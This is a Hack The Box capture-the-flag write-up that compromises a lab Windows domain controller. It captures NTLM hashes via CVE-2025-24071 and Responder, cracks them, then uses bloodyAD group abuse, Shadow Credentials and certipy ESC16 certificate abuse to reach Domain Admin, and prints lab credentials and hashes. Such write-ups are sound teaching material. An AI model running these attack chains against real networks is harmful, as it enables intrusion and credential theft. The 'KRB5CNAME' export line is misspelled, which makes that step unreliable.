@@ -1,0 +1,302 @@
+---
+title: HTB - Fluffy (easy)
+date: '2025-05-19'
+tags: ['machine', 'windows', 'Active Directory', 'GenericAll', 'Shadow-Credentials', 'ESC16']
+draft: false
+summary:  Enumerating SMB shares from given credentials reveals a hint about CVE-2025-24071 which leaks an NTLM hash then using that credential to map out ACE misconfigurations in Bloodhound which shows that the user has 'GenericAll' permission on 'Service Accounts' group. Using Shadow Credentials technique to gather NT hashes for Service Accounts then discovering that the CA issued a ceritificate vulnerable to ESC16. Thus, gaining Domain Admin.   
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+> [!NOTE]
+> Given Credentials -> `j.fleischman:J0elTHEM4n1990!`
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.10.11.69
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 20:24 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 20:24
+Completed NSE at 20:24, 0.00s elapsed
+Initiating NSE at 20:24
+Completed NSE at 20:24, 0.00s elapsed
+Initiating NSE at 20:24
+Completed NSE at 20:24, 0.00s elapsed
+Initiating Connect Scan at 20:24
+Scanning fluffy.htb (10.10.11.69) [1000 ports]
+Discovered open port 445/tcp on 10.10.11.69
+Discovered open port 53/tcp on 10.10.11.69
+Discovered open port 139/tcp on 10.10.11.69
+Discovered open port 3268/tcp on 10.10.11.69
+Discovered open port 88/tcp on 10.10.11.69
+Discovered open port 389/tcp on 10.10.11.69
+Discovered open port 3269/tcp on 10.10.11.69
+Discovered open port 593/tcp on 10.10.11.69
+Discovered open port 464/tcp on 10.10.11.69
+Discovered open port 636/tcp on 10.10.11.69
+Completed Connect Scan at 20:24, 4.27s elapsed (1000 total ports)
+Initiating Service scan at 20:24
+Scanning 10 services on fluffy.htb (10.10.11.69)
+Completed Service scan at 20:25, 45.50s elapsed (10 services on 1 host)
+NSE: Script scanning 10.10.11.69.
+Initiating NSE at 20:25
+Completed NSE at 20:26, 40.10s elapsed
+Initiating NSE at 20:26
+Completed NSE at 20:26, 1.71s elapsed
+Initiating NSE at 20:26
+Completed NSE at 20:26, 0.00s elapsed
+Nmap scan report for fluffy.htb (10.10.11.69)
+Host is up (0.019s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 19:03:27Z)
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-06-04T19:04:48+00:00; +6h38m31s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+|_ssl-date: 2025-06-04T19:04:47+00:00; +6h38m31s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-06-04T19:04:48+00:00; +6h38m31s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-06-04T19:04:47+00:00; +6h38m31s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h38m30s, deviation: 0s, median: 6h38m30s
+| smb2-time: 
+|   date: 2025-06-04T19:04:08
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 20:26
+Completed NSE at 20:26, 0.00s elapsed
+Initiating NSE at 20:26
+Completed NSE at 20:26, 0.00s elapsed
+Initiating NSE at 20:26
+Completed NSE at 20:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 91.87 seconds
+```
+
+Scanning results reveal SMB is enabled. So, let's start enumerating from there with the given credentials
+
+---
+
+## Enumerating
+
+```
+❯ nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
+❯ nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
+
+```
+
+![Description](/static/images/htb/windows/fluffy/1.jpg)
+
+Apart from `Administrator` and `Guest`, we can see a few users and Service Accounts. Save them in a file called `users.txt`. Other than that, enumerating shares 
+reveal that we have `READ` and `WRITE` permissions over the `IT` share.
+
+Connecting to the share reveals a pdf file
+
+![Description](/static/images/htb/windows/fluffy/2.jpg)
+
+The pdf file hints at two critical CVEs that are present in the system. After doing research, one of them, CVE-2025-24071 has a publicly available [POC](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom)
+
+![Description](/static/images/htb/windows/fluffy/3.jpg)
+
+To put it roughly, the vulnerability lies in Windows Explorer that leaks NTLM hashes when a malicious `.library-ms` file is extracted from a ZIP archive. 
+Windows Explorer automatically initiates an SMB authentication request to a remote server specified in the file, leaking the user's NTLM hash without any user interaction.
+
+The custom metasploit module generates that `.library-ms` in a zip compressed archive file and all we have to do is upload it in the `IT` share and a simulated 'user' will extract it thus leaking the NTLM hash.
+
+![Description](/static/images/htb/windows/fluffy/4.jpg)
+
+After uploading the zip archive, we have to listen on the network using `Responder` with the VPN interface
+
+```
+❯ sudo responder -I tun0 -v
+```
+
+We wait a few seconds and the NTLM hashes should be coming in like this
+
+![Description](/static/images/htb/windows/fluffy/5.jpg)
+
+Nice, we have the hashes for the user `p.agila`, now we proceed to crack it
+
+```
+❯ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![Description](/static/images/htb/windows/fluffy/6.jpg)
+
+`p.agila:prometheusx-303`
+
+---
+
+## Lateral Movement / Situational Awareness
+
+Initially, I tried enumerating accounts that were vulnerable to AS-REP Roasting but none were available
+
+```
+❯ nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --asreproast asrep.txt
+```
+
+![Description](/static/images/htb/windows/fluffy/8.jpg)
+
+Now, this was also a new method I learned. Apparently, when you have valid credentials, using the LDAP protocol, you don't even need to be inside the target machine to gather Sharphound data
+for Bloodhound, you can just use `nxc` or `bloodyAD` remotely. Amazing stuff.
+
+```
+❯ nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --dns-server 10.10.11.69 --bloodhound --collection All
+```
+
+![Description](/static/images/htb/windows/fluffy/7.jpg)
+
+Using the gathered data, we can ingest it in Bloodhound check for any permission misconfiurations.
+
+Looking at our current user `p.agila` has `GenericAll` ACE misconfiguration on Service Accounts group.
+
+![Description](/static/images/htb/windows/fluffy/9.jpg)
+
+Looking into the members of the group we found the 3 service accounts. `ca_svc`, `ldap_svc` and `winrm_svc`
+
+![Description](/static/images/htb/windows/fluffy/10.jpg)
+
+Looking even further we find that the 3 accounts are Kerberoastable
+
+![Description](/static/images/htb/windows/fluffy/11.jpg)
+
+According to this [AD mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg) ,`GenericAll` can be abused
+to add the user itself into the group and use Shadow Credentials technique to Keberoast getting a TGT and the NT hash of the account.
+
+![Description](/static/images/htb/windows/fluffy/12.jpg)
+
+We can add `p.agila` into the Service Accounts grup using `bloodyAD`. [Source](https://www.hackingarticles.in/genericall-active-directory-abuse/)
+
+```
+❯ bloodyAD --host "fluffy.htb" -u "p.agila" -p "prometheusx-303" add groupMember "Service Accounts" "p.agila"
+```
+
+![Description](/static/images/htb/windows/fluffy/13.jpg)
+
+Now, after being added to the group, we can perform Shadow Credentials on the 3 service accounts
+
+`ca_svc`:
+![Description](/static/images/htb/windows/fluffy/14.jpg)
+
+`winrm_svc`:
+![Description](/static/images/htb/windows/fluffy/15.jpg)
+
+`ldap_svc`
+![Description](/static/images/htb/windows/fluffy/16.jpg)
+
+---
+
+## Gaining Access
+
+After retrieving the NT hashes, only `winrm_svc` account is allowed to `winrm` to the machine. Thus, getting the user flag
+
+![Description](/static/images/htb/windows/fluffy/17.jpg)
+
+---
+
+## Privilege Escalation
+
+For this part it was a little bit tricky for me since I wasn't used to ADCS exploitation but I went back and looked at Bloodhound and saw that `ca_svc` was a member of
+the 'Cert Publishers' group
+
+![Description](/static/images/htb/windows/fluffy/18.jpg)
+
+So, what we can do from here is use `ca_svc`'s NT hash to authenticate and find vulnerable CA certs
+
+```
+❯ certipy find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 10.10.11.69 -stdout -vulnerable
+```
+
+![Description](/static/images/htb/windows/fluffy/19.jpg)
+
+We can observe that the CA is vulnerable to ESC16. We can easily replicate the steps [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
+and get Domain Admin.
+
+Notice that earlier we received our TGT in the `.ccache` format. We need to set the Kerberos credential cache environment variable.
+
+```
+❯ export KRB5CNAME=ca_svc.ccache
+```
+
+Then, we request the Certificate as the "victim" user from any suitable client authentication template (e.g., "User") on the ESC16-vulnerable CA.
+
+```
+❯ certipy req -k -dc-ip 10.10.11.69 -target DC01.fluffy.htb -ca fluffy-DC01-CA -template User
+```
+
+![Description](/static/images/htb/windows/fluffy/20.jpg)
+
+Now that we have the private key, we authenticate as the target `Administrator`
+
+```
+❯ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb
+```
+
+![Description](/static/images/htb/windows/fluffy/21.jpg)
+
+Cool, now that we have the `Administrator`'s NT hash, we can `winrm` into his Desktop and get the flag
+
+![Description](/static/images/htb/windows/fluffy/22.jpg)
+
+![Description](/static/images/htb/windows/fluffy/23.jpg)
+
+
+
+
